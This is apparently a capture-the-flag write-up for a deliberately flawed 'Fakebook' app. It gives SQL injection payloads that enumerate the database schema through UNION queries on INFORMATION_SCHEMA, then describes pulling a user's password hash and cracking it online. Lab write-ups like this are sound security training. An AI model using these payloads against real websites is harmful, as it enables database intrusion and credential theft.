# Fakebook

## Description
Fakebook is an online social media platform, but it is still in the development phase, hence there may be some flaws. Note: Quotes are filtered!

Exploit the SQLi flaw in the application and log in as LeonSKennedy!

## Solution
1. First let us try a general sql injection: `1 or 1=1-- -`. We can see that that only one column is displayed.
   
2. With the following injections, we can narrow down the different tables, coulmns and the schemas they belong to:

   `1 UNION select TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS-- -`

    There are 2 schemas: public, information_schema

   `1 UNION select TABLE_NAME||TABLE_SCHEMA  from INFORMATION_SCHEMA.COLUMNS-- -`

   There are 2 tables that we might find useful: public.fakebook, information_schema.users

   `1 UNION select COLUMN_NAME||TABLE_NAME||TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS-- -`

   public.fakebook has the following columns we might find useful: password, username.
   Unfortunately, the users table does not seem very useful. (It has columns such as Admin, Name and Remarks)

3. Now we have all the information we need. Let us find the password for LeonSKennedy! Use the following command to find the password:
   
     <img width="328" alt="image" src="https://github.com/swaathiLaks/Mimosa-Solutions/assets/113973466/29cd7acc-d4e1-4b1f-99aa-40a28273a7a8">

      However, it appears the password is hashed. Let's dehash it.
   
4. I ended up using a website to dehash the password. When I figure an offline method that will work on windows, I will update this file.

    <img width="616" alt="image" src="https://github.com/swaathiLaks/Mimosa-Solutions/assets/113973466/2447c0e4-b196-4306-b4b9-6496cd0e8785">
